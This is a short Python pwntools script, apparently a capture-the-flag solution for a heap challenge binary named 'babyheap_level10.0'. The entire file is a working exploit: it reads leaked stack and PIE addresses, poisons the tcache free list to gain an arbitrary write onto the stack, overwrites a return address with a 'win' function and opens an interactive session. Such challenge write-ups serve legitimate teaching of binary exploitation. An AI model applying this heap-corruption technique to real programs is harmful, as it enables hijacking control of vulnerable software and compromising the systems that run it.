from pwn import *

r = process('/challenge/babyheap_level10.0')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{num}'.encode())

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}'.encode())    

def edit(idx,s):
    r.sendline(b'scanf')
    r.sendline(f'{idx}'.encode())
    r.sendline(s)

def puts(idx):
    r.sendline(b'puts')
    r.sendline(f'{idx}'.encode())
    r.recvuntil(b'Data: ')

    return r.recvline().strip()

win = 0x1a00


r.recvuntil(b'allocations is at: ')
stack = int(r.recvuntil(b'.',drop = True),16) + 0x118
print(hex(stack))

r.recvuntil(b'main is at: ')
pie = int(r.recvuntil(b'.',drop = True),16) - 0x1afd
print(hex(pie))


malloc(0,0x50)
malloc(1,0x50)
free(0)
free(1)
edit(1,p64(stack))
malloc(2,0x50)
malloc(3,0x50)
edit(3,p64(pie+win))
r.sendline(b'quit')
r.interactive()